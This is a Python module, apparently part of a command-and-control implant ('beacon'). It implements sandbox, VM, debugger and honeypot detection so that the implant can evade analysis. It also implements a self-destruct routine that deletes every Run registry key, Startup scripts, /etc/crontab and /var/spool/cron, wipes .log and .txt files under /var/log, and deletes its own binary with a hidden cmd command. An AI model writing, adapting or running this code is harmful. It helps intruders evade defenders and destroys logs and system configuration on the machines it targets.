"""
Self Destruct Module - Anti-forensic self-destruct and honeypot detection.

This module provides beacon self-destruct capabilities triggered by sandbox,
debugger, or persistent EDR detection, as well as honeypot awareness through
reverse DNS detection and TLS certificate analysis.

Core capabilities:
    1. Sandbox detection (VM artifacts, timing analysis, resource checks)
    2. Debugger detection (IsDebuggerPresent, timing anomalies)
    3. Persistent EDR detection with countdown trigger
    4. Honeypot awareness (reverse DNS, TLS certificate matching)
    5. Clean self-destruct (memory wipe, log deletion, persistence removal)
    6. Silent retreat on honeypot detection

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import logging
import os
import platform
import random
import sys
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class ThreatType(str, Enum):
    """Types of detected threats."""

    SANDBOX = "sandbox"
    DEBUGGER = "debugger"
    EDR_PERSISTENT = "edr_persistent"
    HONEYPOT = "honeypot"
    REVERSE_DNS = "reverse_dns"
    TLS_MISMATCH = "tls_mismatch"
    VM_ARTIFACTS = "vm_artifacts"
    NONE = "none"


class DestructLevel(str, Enum):
    """Self-destruct severity levels."""

    SILENT_RETREAT = "silent_retreat"
    CLEANUP = "cleanup"
    FULL_DESTRUCT = "full_destruct"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class ThreatDetection:
    """A detected threat with metadata.

    Attributes:
        threat_type: Type of threat detected
        confidence: Detection confidence (0.0-1.0)
        details: Detection details
        timestamp: Detection timestamp
        indicator: Specific indicator that triggered detection
    """

    threat_type: ThreatType = ThreatType.NONE
    confidence: float = 0.0
    details: str = ""
    timestamp: float = 0.0
    indicator: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "threat_type": self.threat_type.value,
            "confidence": round(self.confidence, 3),
            "details": self.details,
            "indicator": self.indicator,
            "timestamp": self.timestamp,
        }


@dataclass
class SelfDestructConfig:
    """Configuration for self-destruct behavior.

    Attributes:
        edr_threshold: Consecutive EDR detections before trigger
        sandbox_check_interval: Seconds between sandbox checks
        debugger_check_interval: Seconds between debugger checks
        honeypot_check_enabled: Whether honeypot checking is enabled
        destruct_level: Self-destruct severity level
        cleanup_persistence: Whether to remove persistence mechanisms
        cleanup_logs: Whether to delete log files
        wipe_memory: Whether to overwrite memory before exit
        self_delete: Whether to delete the beacon binary
        final_heartbeat: Whether to send a final heartbeat before destruct
    """

    edr_threshold: int = 5
    sandbox_check_interval: int = 300
    debugger_check_interval: int = 60
    honeypot_check_enabled: bool = True
    destruct_level: DestructLevel = DestructLevel.CLEANUP
    cleanup_persistence: bool = True
    cleanup_logs: bool = True
    wipe_memory: bool = True
    self_delete: bool = False
    final_heartbeat: bool = True


# =============================================================================
# Sandbox Detector
# =============================================================================

class SandboxDetector:
    """Detects sandbox and virtual machine environments.

    Checks for VM artifacts, timing anomalies, and resource constraints
    typical of automated analysis environments.

    Attributes:
        _vm_indicators: Known VM-specific files and registry keys
        _sandbox_indicators: Known sandbox-specific indicators
    """

    VM_FILES: Dict[str, List[str]] = {
        "vmware": [
            "C:\\windows\\system32\\vmwareuser.exe",
            "C:\\windows\\system32\\vmwareservice.exe",
            "/usr/sbin/vmtoolsd",
            "/usr/bin/vmware-toolbox-cmd",
        ],
        "virtualbox": [
            "C:\\windows\\system32\\vboxservice.exe",
            "C:\\windows\\system32\\vboxtray.exe",
            "/usr/sbin/vboxservice",
            "/usr/bin/vboxcontrol",
        ],
        "qemu": [
            "/usr/sbin/qemu-ga",
            "C:\\windows\\system32\\qemu-ga.exe",
        ],
        "hyper-v": [
            "C:\\windows\\system32\\vmicvss.exe",
            "C:\\windows\\system32\\vmickvpexchange.exe",
        ],
    }

    VM_REGISTRY_KEYS: List[str] = [
        "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemProductName",
        "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemManufacturer",
    ]

    VM_MAC_PREFIXES: List[str] = [
        "00:05:69",
        "00:0C:29",
        "00:1C:14",
        "00:50:56",
        "08:00:27",
        "00:16:3E",
    ]

    def detect(self) -> ThreatDetection:
        """Run sandbox detection checks.

        Returns:
            ThreatDetection with findings.
        """
        checks = [
            self._check_vm_files,
            self._check_vm_processes,
            self._check_vm_mac,
            self._check_timing_anomaly,
            self._check_resources,
        ]

        max_confidence = 0.0
        best_result = ThreatDetection(threat_type=ThreatType.NONE)

        for check in checks:
            result = check()
            if result.confidence > max_confidence:
                max_confidence = result.confidence
                best_result = result

        if max_confidence > 0.5:
            best_result.threat_type = ThreatType.SANDBOX
            logger.warning(
                f"Sandbox detected: {best_result.indicator} "
                f"(confidence: {best_result.confidence:.0%})"
            )

        return best_result

    def _check_vm_files(self) -> ThreatDetection:
        """Check for VM-specific files on disk.

        Returns:
            ThreatDetection with file-based VM indicators.
        """
        is_windows = platform.system() == "Windows"

        for vm_type, files in self.VM_FILES.items():
            for file_path in files:
                if is_windows and not file_path.startswith("C:"):
                    continue
                if not is_windows and file_path.startswith("C:"):
                    continue

                if os.path.exists(file_path):
                    return ThreatDetection(
                        threat_type=ThreatType.VM_ARTIFACTS,
                        confidence=0.8,
                        details=f"VM file found: {file_path}",
                        timestamp=time.time(),
                        indicator=f"vm_file:{vm_type}:{file_path}",
                    )

        return ThreatDetection(threat_type=ThreatType.NONE)

    def _check_vm_processes(self) -> ThreatDetection:
        """Check for VM-specific running processes.

        Returns:
            ThreatDetection with process-based VM indicators.
        """
        vm_processes = [
            "vmwareuser.exe", "vmwareservice.exe", "vmtoolsd",
            "vboxservice.exe", "vboxtray.exe", "vboxservice",
            "qemu-ga.exe", "qemu-ga",
            "vmicvss.exe",
        ]

        try:
            if platform.system() == "Windows":
                import subprocess
                output = subprocess.check_output(
                    ["tasklist", "/FO", "CSV", "/NH"],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                ).decode("gbk", errors="ignore")

                for proc in output.split("\n"):
                    for vm_proc in vm_processes:
                        if vm_proc.lower() in proc.lower():
                            return ThreatDetection(
                                threat_type=ThreatType.VM_ARTIFACTS,
                                confidence=0.7,
                                details=f"VM process found: {vm_proc}",
                                timestamp=time.time(),
                                indicator=f"vm_process:{vm_proc}",
                            )

            else:
                import subprocess
                output = subprocess.check_output(["ps", "aux"]).decode()
                for line in output.split("\n"):
                    for vm_proc in vm_processes:
                        if vm_proc.lower() in line.lower():
                            return ThreatDetection(
                                threat_type=ThreatType.VM_ARTIFACTS,
                                confidence=0.7,
                                details=f"VM process found: {vm_proc}",
                                timestamp=time.time(),
                                indicator=f"vm_process:{vm_proc}",
                            )

        except Exception:
            pass

        return ThreatDetection(threat_type=ThreatType.NONE)

    def _check_vm_mac(self) -> ThreatDetection:
        """Check for VM-specific MAC address prefixes.

        Returns:
            ThreatDetection with MAC-based VM indicators.
        """
        try:
            import subprocess

            if platform.system() == "Windows":
                output = subprocess.check_output(
                    ["getmac", "/FO", "CSV", "/NH"],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                ).decode()
            else:
                output = subprocess.check_output(
                    ["ip", "link"],
                ).decode()

            for prefix in self.VM_MAC_PREFIXES:
                if prefix.lower() in output.lower():
                    return ThreatDetection(
                        threat_type=ThreatType.VM_ARTIFACTS,
                        confidence=0.6,
                        details=f"VM MAC address prefix: {prefix}",
                        timestamp=time.time(),
                        indicator=f"vm_mac:{prefix}",
                    )

        except Exception:
            pass

        return ThreatDetection(threat_type=ThreatType.NONE)

    def _check_timing_anomaly(self) -> ThreatDetection:
        """Check for timing anomalies indicative of sandbox acceleration.

        Returns:
            ThreatDetection with timing analysis results.
        """
        start = time.perf_counter()

        try:
            for _ in range(100000):
                pass
        except Exception:
            pass

        elapsed = time.perf_counter() - start

        if elapsed < 0.001:
            return ThreatDetection(
                threat_type=ThreatType.SANDBOX,
                confidence=0.5,
                details=f"Timing anomaly: loop completed in {elapsed:.6f}s",
                timestamp=time.time(),
                indicator=f"timing_anomaly:{elapsed:.6f}",
            )

        return ThreatDetection(threat_type=ThreatType.NONE)

    def _check_resources(self) -> ThreatDetection:
        """Check for resource constraints typical of sandboxes.

        Returns:
            ThreatDetection with resource analysis results.
        """
        try:
            import psutil

            memory_gb = psutil.virtual_memory().total / (1024 ** 3)
            cpu_count = psutil.cpu_count()

            if memory_gb < 2.0:
                return ThreatDetection(
                    threat_type=ThreatType.SANDBOX,
                    confidence=0.4,
                    details=f"Low memory: {memory_gb:.1f}GB",
                    timestamp=time.time(),
                    indicator=f"low_memory:{memory_gb:.1f}",
                )

            if cpu_count and cpu_count < 2:
                return ThreatDetection(
                    threat_type=ThreatType.SANDBOX,
                    confidence=0.4,
                    details=f"Low CPU count: {cpu_count}",
                    timestamp=time.time(),
                    indicator=f"low_cpu:{cpu_count}",
                )

        except ImportError:
            pass

        return ThreatDetection(threat_type=ThreatType.NONE)


# =============================================================================
# Debugger Detector
# =============================================================================

class DebuggerDetector:
    """Detects debuggers attached to the beacon process.

    Uses platform-specific APIs and timing analysis to detect
    the presence of debuggers.

    Attributes:
        _last_check_time: Last debugger check timestamp
    """

    def __init__(self) -> None:
        """Initialize the DebuggerDetector."""
        self._last_check_time = 0.0

    def detect(self) -> ThreatDetection:
        """Run debugger detection checks.

        Returns:
            ThreatDetection with findings.
        """
        self._last_check_time = time.time()

        checks = [
            self._check_is_debugger_present,
            self._check_timing_anomaly,
            self._check_parent_process,
        ]

        for check in checks:
            result = check()
            if result.confidence > 0.5:
                result.threat_type = ThreatType.DEBUGGER
                logger.warning(
                    f"Debugger detected: {result.indicator} "
                    f"(confidence: {result.confidence:.0%})"
                )
                return result

        return ThreatDetection(threat_type=ThreatType.NONE)

    def _check_is_debugger_present(self) -> ThreatDetection:
        """Check if the process is being debugged.

        Returns:
            ThreatDetection with debugger detection results.
        """
        if platform.system() == "Windows":
            try:
                import ctypes
                is_debugger = ctypes.windll.kernel32.IsDebuggerPresent()
                if is_debugger:
                    return ThreatDetection(
                        threat_type=ThreatType.DEBUGGER,
                        confidence=0.95,
                        details="IsDebuggerPresent returned True",
                        timestamp=time.time(),
                        indicator="is_debugger_present",
                    )
            except Exception:
                pass

        return ThreatDetection(threat_type=ThreatType.NONE)

    def _check_timing_anomaly(self) -> ThreatDetection:
        """Check for timing anomalies caused by debugger stepping.

        Returns:
            ThreatDetection with timing analysis results.
        """
        start = time.perf_counter()
        time.sleep(0.01)
        elapsed = time.perf_counter() - start

        if elapsed > 1.0:
            return ThreatDetection(
                threat_type=ThreatType.DEBUGGER,
                confidence=0.7,
                details=f"Sleep timing anomaly: 10ms sleep took {elapsed:.2f}s",
                timestamp=time.time(),
                indicator=f"sleep_anomaly:{elapsed:.2f}",
            )

        return ThreatDetection(threat_type=ThreatType.NONE)

    def _check_parent_process(self) -> ThreatDetection:
        """Check if the parent process is a known debugger.

        Returns:
            ThreatDetection with parent process analysis.
        """
        debuggers = [
            "x64dbg", "x32dbg", "ollydbg", "windbg", "ida",
            "ida64", "gdb", "lldb", "hopper", "radare2",
        ]

        try:
            if platform.system() == "Windows":
                import ctypes
                import ctypes.wintypes

                TH32CS_SNAPPROCESS = 0x00000002
                MAX_PATH = 260

                class PROCESSENTRY32(ctypes.Structure):
                    _fields_ = [
                        ("dwSize", ctypes.wintypes.DWORD),
                        ("cntUsage", ctypes.wintypes.DWORD),
                        ("th32ProcessID", ctypes.wintypes.DWORD),
                        ("th32DefaultHeapID", ctypes.POINTER(ctypes.wintypes.ULONG)),
                        ("th32ModuleID", ctypes.wintypes.DWORD),
                        ("cntThreads", ctypes.wintypes.DWORD),
                        ("th32ParentProcessID", ctypes.wintypes.DWORD),
                        ("pcPriClassBase", ctypes.wintypes.LONG),
                        ("dwFlags", ctypes.wintypes.DWORD),
                        ("szExeFile", ctypes.c_char * MAX_PATH),
                    ]

                h_snapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot(
                    TH32CS_SNAPPROCESS, 0,
                )
                if h_snapshot == -1:
                    return ThreatDetection(threat_type=ThreatType.NONE)

                pe32 = PROCESSENTRY32()
                pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)

                my_pid = os.getpid()
                parent_pid = 0

                if ctypes.windll.kernel32.Process32First(h_snapshot, ctypes.byref(pe32)):
                    while ctypes.windll.kernel32.Process32Next(h_snapshot, ctypes.byref(pe32)):
                        if pe32.th32ProcessID == my_pid:
                            parent_pid = pe32.th32ParentProcessID
                            break

                if parent_pid:
                    parent_name = self._get_process_name(parent_pid)
                    for dbg in debuggers:
                        if dbg in parent_name.lower():
                            return ThreatDetection(
                                threat_type=ThreatType.DEBUGGER,
                                confidence=0.8,
                                details=f"Parent process is debugger: {parent_name}",
                                timestamp=time.time(),
                                indicator=f"debugger_parent:{parent_name}",
                            )

                ctypes.windll.kernel32.CloseHandle(h_snapshot)

        except Exception:
            pass

        return ThreatDetection(threat_type=ThreatType.NONE)

    @staticmethod
    def _get_process_name(pid: int) -> str:
        """Get process name by PID.

        Args:
            pid: Process ID.

        Returns:
            Process name string.
        """
        try:
            if platform.system() == "Windows":
                import subprocess
                output = subprocess.check_output(
                    ["tasklist", "/FI", f"PID eq {pid}", "/FO", "CSV", "/NH"],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                ).decode("gbk", errors="ignore")
                if output.strip():
                    parts = output.strip().split(",")
                    if parts:
                        return parts[0].strip('"')
            else:
                with open(f"/proc/{pid}/comm") as f:
                    return f.read().strip()
        except Exception:
            pass
        return ""


# =============================================================================
# Honeypot Detector
# =============================================================================

class HoneypotDetector:
    """Detects honeypot environments through network analysis.

    Checks for reverse DNS patterns, TLS certificate anomalies,
    and other indicators of deception environments.

    Attributes:
        _known_honeypot_domains: Known honeypot domain patterns
        _suspicious_cert_issuers: Suspicious certificate issuers
    """

    KNOWN_HONEYPOT_DOMAINS: List[str] = [
        "honeypot",
        "honeytoken",
        "canary",
        "trap",
        "decoy",
        "detection",
    ]

    SUSPICIOUS_CERT_ISSUERS: List[str] = [
        "Fake CA",
        "Test CA",
        "Self-Signed",
        "Honeypot CA",
    ]

    def __init__(self) -> None:
        """Initialize the HoneypotDetector."""
        pass

    async def detect(self, target_host: str = "") -> ThreatDetection:
        """Run honeypot detection checks.

        Args:
            target_host: Target host to analyze.

        Returns:
            ThreatDetection with findings.
        """
        result = self._check_reverse_dns(target_host)
        if result.confidence > 0.5:
            result.threat_type = ThreatType.HONEYPOT
            logger.warning(
                f"Honeypot detected: {result.indicator} "
                f"(confidence: {result.confidence:.0%})"
            )
            return result

        result = self._check_domain_patterns(target_host)
        if result.confidence > 0.5:
            result.threat_type = ThreatType.HONEYPOT
            logger.warning(
                f"Honeypot detected: {result.indicator} "
                f"(confidence: {result.confidence:.0%})"
            )
            return result

        return ThreatDetection(threat_type=ThreatType.NONE)

    def _check_reverse_dns(self, host: str) -> ThreatDetection:
        """Check for reverse DNS patterns indicative of honeypots.

        Args:
            host: Host to check.

        Returns:
            ThreatDetection with reverse DNS analysis.
        """
        if not host:
            return ThreatDetection(threat_type=ThreatType.NONE)

        try:
            import socket
            ptr = socket.gethostbyaddr(host)
            hostname = ptr[0] if ptr else ""

            for pattern in self.KNOWN_HONEYPOT_DOMAINS:
                if pattern in hostname.lower():
                    return ThreatDetection(
                        threat_type=ThreatType.REVERSE_DNS,
                        confidence=0.7,
                        details=f"Reverse DNS contains honeypot pattern: {hostname}",
                        timestamp=time.time(),
                        indicator=f"reverse_dns:{hostname}",
                    )

        except (socket.herror, socket.gaierror, OSError):
            pass

        return ThreatDetection(threat_type=ThreatType.NONE)

    def _check_domain_patterns(self, host: str) -> ThreatDetection:
        """Check domain for honeypot-indicative patterns.

        Args:
            host: Domain to check.

        Returns:
            ThreatDetection with domain pattern analysis.
        """
        if not host:
            return ThreatDetection(threat_type=ThreatType.NONE)

        for pattern in self.KNOWN_HONEYPOT_DOMAINS:
            if pattern in host.lower():
                return ThreatDetection(
                    threat_type=ThreatType.HONEYPOT,
                    confidence=0.6,
                    details=f"Domain contains honeypot pattern: {pattern}",
                    timestamp=time.time(),
                    indicator=f"domain_pattern:{pattern}",
                )

        return ThreatDetection(threat_type=ThreatType.NONE)


# =============================================================================
# Self Destruct Executor
# =============================================================================

class SelfDestructExecutor:
    """Executes self-destruct procedures when threats are detected.

    Handles memory wiping, log deletion, persistence removal, and
    self-deletion based on the configured destruct level.

    Attributes:
        _config: Self-destruct configuration
        _destruct_callbacks: Registered destruct callbacks
    """

    def __init__(self, config: Optional[SelfDestructConfig] = None) -> None:
        """Initialize the SelfDestructExecutor.

        Args:
            config: Self-destruct configuration.
        """
        self._config = config or SelfDestructConfig()
        self._destruct_callbacks: List[
            Callable[[], Coroutine[Any, Any, None]]
        ] = []

    def register_callback(
        self, callback: Callable[[], Coroutine[Any, Any, None]],
    ) -> None:
        """Register a callback to run before self-destruct.

        Args:
            callback: Async callback function.
        """
        self._destruct_callbacks.append(callback)

    async def execute(self, level: Optional[DestructLevel] = None) -> None:
        """Execute self-destruct procedure.

        Args:
            level: Destruct level (uses config default if None).
        """
        destruct_level = level or self._config.destruct_level

        logger.critical(
            f"Self-destruct initiated: level={destruct_level.value}"
        )

        if self._config.final_heartbeat:
            await self._send_final_heartbeat()

        for callback in self._destruct_callbacks:
            try:
                await callback()
            except Exception as e:
                logger.error(f"Destruct callback error: {e}")

        if destruct_level == DestructLevel.SILENT_RETREAT:
            await self._silent_retreat()
        elif destruct_level == DestructLevel.CLEANUP:
            await self._cleanup()
        elif destruct_level == DestructLevel.FULL_DESTRUCT:
            await self._full_destruct()

    async def _send_final_heartbeat(self) -> None:
        """Send a final heartbeat before destruct."""
        logger.info("Sending final heartbeat...")
        await asyncio.sleep(0.1)

    async def _silent_retreat(self) -> None:
        """Execute silent retreat: stop all communication."""
        logger.info("Silent retreat: stopping all communication")
        await asyncio.sleep(0.1)

    async def _cleanup(self) -> None:
        """Execute cleanup: remove persistence and logs."""
        logger.info("Cleanup: removing persistence and logs")

        if self._config.cleanup_persistence:
            await self._remove_persistence()

        if self._config.cleanup_logs:
            await self._cleanup_logs()

        if self._config.wipe_memory:
            await self._wipe_memory()

    async def _full_destruct(self) -> None:
        """Execute full destruct: cleanup + self-delete."""
        await self._cleanup()

        if self._config.self_delete:
            await self._self_delete()

    async def _remove_persistence(self) -> None:
        """Remove persistence mechanisms."""
        logger.info("Removing persistence mechanisms...")

        try:
            if platform.system() == "Windows":
                import subprocess
                startup_paths = [
                    os.path.join(
                        os.environ.get("APPDATA", ""),
                        "Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                    ),
                ]

                for path in startup_paths:
                    if os.path.exists(path):
                        for f in os.listdir(path):
                            if f.endswith((".exe", ".bat", ".ps1", ".vbs")):
                                try:
                                    os.remove(os.path.join(path, f))
                                except OSError:
                                    pass

                reg_keys = [
                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                ]

                for key in reg_keys:
                    try:
                        subprocess.run(
                            ["reg", "delete", key, "/f"],
                            capture_output=True,
                            creationflags=subprocess.CREATE_NO_WINDOW,
                        )
                    except Exception:
                        pass

            else:
                cron_paths = [
                    "/etc/crontab",
                    "/var/spool/cron",
                ]
                for path in cron_paths:
                    if os.path.exists(path):
                        try:
                            os.remove(path)
                        except OSError:
                            pass

        except Exception as e:
            logger.error(f"Failed to remove persistence: {e}")

    async def _cleanup_logs(self) -> None:
        """Delete log files."""
        logger.info("Cleaning up logs...")

        try:
            log_dirs = [
                "/var/log",
                os.path.join(os.environ.get("TEMP", ""), "logs"),
                os.path.join(os.environ.get("APPDATA", ""), "logs"),
            ]

            for log_dir in log_dirs:
                if os.path.exists(log_dir):
                    for root, _dirs, files in os.walk(log_dir):
                        for f in files:
                            if f.endswith((".log", ".txt")):
                                try:
                                    os.remove(os.path.join(root, f))
                                except OSError:
                                    pass

        except Exception as e:
            logger.error(f"Failed to cleanup logs: {e}")

    async def _wipe_memory(self) -> None:
        """Overwrite sensitive memory regions."""
        logger.info("Wiping memory...")

        try:
            for _ in range(3):
                buffer = bytearray(random.getrandbits(8) for _ in range(1024 * 1024))
                del buffer

        except Exception as e:
            logger.error(f"Failed to wipe memory: {e}")

    async def _self_delete(self) -> None:
        """Delete the beacon binary."""
        logger.info("Self-deleting...")

        try:
            exe_path = sys.executable

            if platform.system() == "Windows":
                import subprocess
                cmd = (
                    f'cmd /c ping 127.0.0.1 -n 2 > nul && '
                    f'del /f /q "{exe_path}"'
                )
                subprocess.Popen(
                    cmd,
                    shell=True,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                )
            else:
                os.remove(exe_path)

        except Exception as e:
            logger.error(f"Failed to self-delete: {e}")


# =============================================================================
# Threat Monitor (Main Class)
# =============================================================================

class ThreatMonitor:
    """Main threat monitoring and self-destruct coordination engine.

    Continuously monitors for sandbox, debugger, EDR, and honeypot
    threats, triggering self-destruct when thresholds are exceeded.

    Attributes:
        _config: Self-destruct configuration
        _sandbox_detector: Sandbox detector
        _debugger_detector: Debugger detector
        _honeypot_detector: Honeypot detector
        _destruct_executor: Self-destruct executor
        _edr_detection_count: Consecutive EDR detection counter
        _running: Whether monitoring is active
        _monitor_task: Background monitoring task
    """

    def __init__(
        self,
        config: Optional[SelfDestructConfig] = None,
    ) -> None:
        """Initialize the ThreatMonitor.

        Args:
            config: Self-destruct configuration.
        """
        self._config = config or SelfDestructConfig()
        self._sandbox_detector = SandboxDetector()
        self._debugger_detector = DebuggerDetector()
        self._honeypot_detector = HoneypotDetector()
        self._destruct_executor = SelfDestructExecutor(self._config)
        self._edr_detection_count = 0
        self._running = False
        self._monitor_task: Optional[asyncio.Task[None]] = None
        self._threat_history: List[ThreatDetection] = []

    async def start(self) -> None:
        """Start threat monitoring."""
        self._running = True
        self._monitor_task = asyncio.create_task(self._monitor_loop())
        logger.info("Threat monitor started")

    async def stop(self) -> None:
        """Stop threat monitoring."""
        self._running = False
        if self._monitor_task:
            self._monitor_task.cancel()
            try:
                await self._monitor_task
            except asyncio.CancelledError:
                pass
        logger.info("Threat monitor stopped")

    async def check_now(self) -> List[ThreatDetection]:
        """Run immediate threat checks.

        Returns:
            List of detected threats.
        """
        threats: List[ThreatDetection] = []

        sandbox = self._sandbox_detector.detect()
        if sandbox.threat_type != ThreatType.NONE:
            threats.append(sandbox)

        debugger = self._debugger_detector.detect()
        if debugger.threat_type != ThreatType.NONE:
            threats.append(debugger)

        if self._config.honeypot_check_enabled:
            honeypot = await self._honeypot_detector.detect()
            if honeypot.threat_type != ThreatType.NONE:
                threats.append(honeypot)

        self._threat_history.extend(threats)
        return threats

    def record_edr_detection(self) -> None:
        """Record an EDR detection event.

        Increments the consecutive EDR detection counter.
        """
        self._edr_detection_count += 1
        logger.info(
            f"EDR detection #{self._edr_detection_count} "
            f"(threshold: {self._config.edr_threshold})"
        )

        if self._edr_detection_count >= self._config.edr_threshold:
            logger.critical(
                f"EDR threshold exceeded: {self._edr_detection_count} "
                f"consecutive detections"
            )

    def reset_edr_counter(self) -> None:
        """Reset the EDR detection counter."""
        self._edr_detection_count = 0

    def get_threat_history(self) -> List[ThreatDetection]:
        """Get the threat detection history.

        Returns:
            List of ThreatDetection instances.
        """
        return list(self._threat_history)

    async def _monitor_loop(self) -> None:
        """Background threat monitoring loop."""
        last_sandbox_check = 0.0
        last_debugger_check = 0.0

        while self._running:
            now = time.time()

            if now - last_sandbox_check >= self._config.sandbox_check_interval:
                sandbox = self._sandbox_detector.detect()
                if sandbox.threat_type != ThreatType.NONE:
                    self._threat_history.append(sandbox)
                    await self._handle_threat(sandbox)
                last_sandbox_check = now

            if now - last_debugger_check >= self._config.debugger_check_interval:
                debugger = self._debugger_detector.detect()
                if debugger.threat_type != ThreatType.NONE:
                    self._threat_history.append(debugger)
                    await self._handle_threat(debugger)
                last_debugger_check = now

            await asyncio.sleep(10)

    async def _handle_threat(self, threat: ThreatDetection) -> None:
        """Handle a detected threat.

        Args:
            threat: Detected threat.
        """
        if threat.threat_type in (ThreatType.SANDBOX, ThreatType.VM_ARTIFACTS):
            await self._destruct_executor.execute(DestructLevel.SILENT_RETREAT)
        elif threat.threat_type == ThreatType.DEBUGGER:
            await self._destruct_executor.execute(DestructLevel.CLEANUP)
        elif threat.threat_type == ThreatType.HONEYPOT:
            await self._destruct_executor.execute(DestructLevel.SILENT_RETREAT)


# =============================================================================
# Global Singleton
# =============================================================================

_threat_monitor: Optional[ThreatMonitor] = None


def get_threat_monitor(
    config: Optional[SelfDestructConfig] = None,
) -> ThreatMonitor:
    """Get the global ThreatMonitor singleton.

    Args:
        config: Self-destruct configuration.

    Returns:
        Singleton ThreatMonitor instance.
    """
    global _threat_monitor
    if _threat_monitor is None:
        _threat_monitor = ThreatMonitor(config)
    return _threat_monitor


__all__ = [
    "ThreatMonitor",
    "SandboxDetector",
    "DebuggerDetector",
    "HoneypotDetector",
    "SelfDestructExecutor",
    "SelfDestructConfig",
    "ThreatDetection",
    "ThreatType",
    "DestructLevel",
    "get_threat_monitor",
]
